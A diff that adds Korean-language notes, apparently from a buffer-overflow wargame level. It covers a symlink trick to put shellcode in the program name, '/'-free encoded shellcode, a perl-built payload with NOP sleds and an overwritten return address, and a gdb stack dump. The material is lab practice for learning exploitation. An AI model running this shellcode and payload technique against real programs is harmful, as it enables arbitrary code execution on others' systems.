@@ -1,0 +1,46 @@
+
+0xbfffffdf:      ""
+0xbfffffe0:      ""
+0xbfffffe1:      ""
+0xbfffffe2:      ""
+0xbfffffe3:      "/home/vampire/skeletonia"
+0xbffffffc:      ""
+
+심볼릭 링크:
+ln -s ./skeleton
+`perl -e 'print "\x90"x150,"["\x2f"이 포함되지 않은 쉘]","\x90"x50'`
+
+****쉘이 스택의 맨 위에 있으면 실행이 잘 안될 우려가 있음, 때문에 뒤에도 쉘을 조금 삽입하여 쉘이 stack의 꼭대기에서 멀어지게 해야함.
+		-> 이거 때문에 하루 삽질함.
+
+쉘:
+\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81
+
+목표 주소(RET):
+0xbfffff38
+
+페이로드:
+./`perl -e 'print "\x90"x150,"\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81","\x90"x50'` `perl -e 'print "\x90"x40,"AAAA","\x38\xff\xff\xbf"'`
+
+
+(RET 주소 확인을 위한 캡쳐)
+0xbffffed8:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffffee8:     0x00000000      0x00000000      0x2f000000      0x656d6f68
+0xbffffef8:     0x6d61762f      0x65726970      0x902f2e2f      0x90909090
+0xbfffff08:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbfffff18:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbfffff28:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbfffff38:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbfffff48:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbfffff58:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbfffff68:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbfffff78:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbfffff88:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbfffff98:     0x5e11eb90      0x32b1c931      0xff0e6c80      0x01e98001
+0xbfffffa8:     0x05ebf675      0xffffeae8      0x51c132ff      0x74303069
+0xbfffffb8:     0x63306969      0xe48a6f6a      0xe28a5451      0xce0cb19a
+0xbfffffc8:     0x90909081      0x90909090      0x90909090      0x90909090
+0xbfffffd8:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbfffffe8:     0x90909090      0x90909090      0x90909090      0x90909090
+---Type <return> to continue, or q <return> to quit---
+0xbffffff8:     0x00909090      0x00000000      Cannot access memory at address
